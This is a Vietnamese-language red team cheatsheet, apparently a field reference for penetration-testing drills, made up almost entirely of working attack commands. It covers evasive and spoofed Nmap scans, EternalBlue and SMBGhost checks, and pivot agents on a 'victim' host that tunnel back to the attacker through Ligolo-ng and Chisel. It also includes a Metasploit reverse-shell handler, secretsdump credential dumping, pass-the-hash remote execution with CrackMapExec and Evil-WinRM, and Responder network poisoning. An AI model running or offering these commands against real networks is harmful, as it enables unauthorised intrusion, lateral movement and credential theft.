# SỔ TAY CÂU LỆNH KIỂM THỬ THÂM NHẬP MẠNG TOÀN TẬP
## MASTER NETWORK PENETRATION TESTING & PIVOTING CHEATSHEET
**Mã hiệu:** `SEC-CHEATSHEET-NET-2026`  
**Phiên bản:** `v3.0 - Tactical Field Edition`  
**Đơn vị biên soạn:** Đội ngũ Chuyên gia Tác chiến An toàn Thông tin (Red Team Operations)  
**Mục đích:** Tra cứu nhanh các câu lệnh thực chiến cho Nmap, Wireshark, Chisel, Ligolo-ng, Metasploit, Responder và các kỹ thuật Pivot mạng nội bộ.

---

## I. NMAP (NETWORK MAPPER) TACTICAL CHEATSHEET

### 1. Quét Cổng & Dịch vụ Nhanh:
```bash
# Quét SYN Stealth toàn bộ 65,535 cổng với tốc độ cao kèm nhận diện dịch vụ
sudo nmap -sS -p- --min-rate 2000 -sV -oA target_all_ports 192.168.1.100

# Quét sâu các cổng phát hiện được kèm script mặc định và nhận diện OS
sudo nmap -sC -sV -O -p 21,22,80,443,445,3389 -oA target_deep 192.168.1.100

# Quét UDP các cổng phổ biến nhất (DNS, SNMP, DHCP, TFTP, NTP)
sudo nmap -sU -p 53,67,68,69,123,161,162,500 -sV 192.168.1.100
```

### 2. Kỹ thuật Quét Né tránh (Evasion Scanning):
```bash
# Phân mảnh gói tin TCP (Fragment packets - 8 bytes per chunk)
sudo nmap -f -sS -p 80,443 192.168.1.100

# Sử dụng MTU tùy chỉnh (MTU phải là bội số của 8: 16, 24, 32...)
sudo nmap --mtu 24 -sS -p 80,443 192.168.1.100

# Giả mạo IP Decoy (trộn lẫn IP thật với 5 IP ngẫu nhiên)
sudo nmap -D RND:5 -sS -p 80,443 192.168.1.100

# Giả mạo địa chỉ nguồn (Spoof Source IP) và Cổng nguồn (Source Port 53 - DNS)
sudo nmap -g 53 -sS -p 80,443 192.168.1.100
```

### 3. Nmap Scripting Engine (NSE) Thực chiến:
```bash
# Quét toàn bộ lỗ hổng đã biết
nmap --script vuln 192.168.1.100

# Kiểm tra lỗ hổng EternalBlue (MS17-010) và SMB Ghost (CVE-2020-0796)
nmap --script smb-vuln-ms17-010,smb-vuln-cve-2020-0796 -p 445 192.168.1.100

# Khảo sát thông tin chia sẻ SMB và người dùng
nmap --script smb-enum-shares,smb-enum-users -p 445 192.168.1.100
```

---

## II. WIRESHARK & TSHARK DISPLAY FILTERS

### Bộ lọc Hiển thị (Display Filters) Thông dụng:
```
# Lọc gói tin theo IP
ip.addr == 192.168.1.50
ip.src == 192.168.1.50 && ip.dst == 192.168.1.1

# Lọc gói tin TCP Handshake
tcp.flags.syn == 1 && tcp.flags.ack == 0       # Gói SYN
tcp.flags.syn == 1 && tcp.flags.ack == 1       # Gói SYN-ACK
tcp.flags.reset == 1                           # Gói RST ngắt kết nối

# Lọc lưu lượng HTTP
http.request.method == "POST"                  # Yêu cầu gửi dữ liệu
http contains "password"                       # Tìm kiếm từ khóa mật khẩu trong gói tin
http.response.code >= 400                      # Lọc mã lỗi HTTP

# Lọc truy vấn DNS
dns.flags.response == 0                        # Truy vấn DNS gửi đi
dns.qry.name contains "targetcorp"             # Lọc theo tên miền

# Lọc gói tin ARP nhiễm độc
arp.duplicate-address-frame                    # Phát hiện đụng độ IP do ARP Spoofing
```

### Trích xuất thông tin tự động bằng `tshark`:
```bash
# Trích xuất toàn bộ URL và User-Agent từ file pcap
tshark -r capture.pcap -Y "http.request" -T fields -e ip.src -e http.host -e http.request.uri -e http.user_agent

# Trích xuất toàn bộ truy vấn DNS
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e ip.src -e dns.qry.name | sort -u
```

---

## III. KỸ THUẬT PIVOTING & PORT FORWARDING (ĐƯỜNG HẦM MẠNG NỘI BỘ)

### 1. Ligolo-ng (Kỹ thuật Pivot Hiện đại nhất qua Giao diện TUN):
```bash
# 1. Trên máy tấn công (Kali Linux):
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# 2. Trên máy nạn nhân (Pivot Agent):
agent.exe -connect <kali_ip>:11601 -ignore-cert

# 3. Quay lại giao diện proxy của Kali:
session                # Chọn session vừa kết nối
start                  # Kích hoạt đường hầm
sudo ip route add 10.10.10.0/24 dev ligolo  # Định tuyến toàn bộ dải mạng nạn nhân qua giao diện ligolo
# Bây giờ có thể dùng Nmap, CrackMapExec trực tiếp đến IP nội bộ 10.10.10.x!
```

### 2. Chisel (Socks5 Proxy qua HTTP/WebSockets):
```bash
# 1. Trên máy Kali Linux (Server):
./chisel server -p 8000 --reverse

# 2. Trên máy nạn nhân (Client):
./chisel client <kali_ip>:8000 R:socks

# 3. Trên máy Kali Linux:
# Cấu hình file /etc/proxychains4.conf: socks5 127.0.0.1 1080
# Sử dụng công cụ thông qua proxychains:
proxychains nmap -sT -Pn -p 80,445 10.10.10.50
proxychains impacket-secretsdump corp.local/admin:'pass'@10.10.10.1
```

### 3. SSH Dynamic Port Forwarding:
```bash
# Tạo SOCKS5 Proxy cục bộ tại cổng 1080 qua máy chủ SSH
ssh -D 1080 -N -f user@pivot_host.com

# Local Port Forwarding: Chuyển tiếp cổng 8080 nội bộ của máy chủ về cổng 8888 của Kali
ssh -L 8888:127.0.0.1:8080 user@pivot_host.com
```

---

## IV. METASPLOIT FRAMEWORK HANDLERS

```bash
# Khởi chạy Multi/Handler cho Meterpreter x64
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
set ExitOnSession false
exploit -j

# Thêm định tuyến nội bộ trong Meterpreter để Pivot:
# meterpreter > run autoroute -s 10.10.10.0/24
# meterpreter > background
# use auxiliary/server/socks_proxy
# run
```

---

## V. CÁC CÔNG CỤ TÁC CHIẾN NỘI BỘ (INTERNAL RED TEAM TOOLS)

```bash
# 1. CrackMapExec (Thám sát và thực thi lệnh hàng loạt qua SMB/WinRM):
crackmapexec smb 10.10.10.0/24 -u user -p password
crackmapexec smb 10.10.10.0/24 -u user -H <ntlm_hash> --exec-method smbexec -x "whoami"

# 2. Evil-WinRM (Shell từ xa qua Windows Remote Management port 5985):
evil-winrm -i 10.10.10.50 -u Administrator -H <ntlm_hash>
evil-winrm -i 10.10.10.50 -u Administrator -p Password123! -s /path/to/scripts

# 3. Responder (Nghe lén và đầu độc mạng nội bộ):
sudo responder -I eth0 -A  # Chế độ Analyze (chỉ nghe, không đầu độc)
sudo responder -I eth0 -dwv # Chế độ Active Poisoning
```

---
*Cheatsheet này là công cụ tra cứu bỏ túi thiết yếu cho mọi kỹ sư tham gia diễn tập Red Team và bảo mật mạng.*
